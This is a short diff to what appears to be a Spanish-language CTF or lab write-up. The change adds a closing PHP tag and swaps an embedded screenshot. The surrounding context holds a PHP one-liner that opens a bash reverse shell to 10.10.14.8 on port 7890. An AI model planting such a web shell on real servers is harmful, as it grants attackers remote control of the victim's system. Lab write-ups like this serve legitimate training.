@@ -170,7 +170,8 @@ esto nos deja con la posibilidad de aplicar un poco de  pensamiento lateral y es
 ```python
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'");
-
+?>
 ```
 
-![[Pasted image 20240823132545.png]]
+![[Pasted image 20240823132731.png]]
+
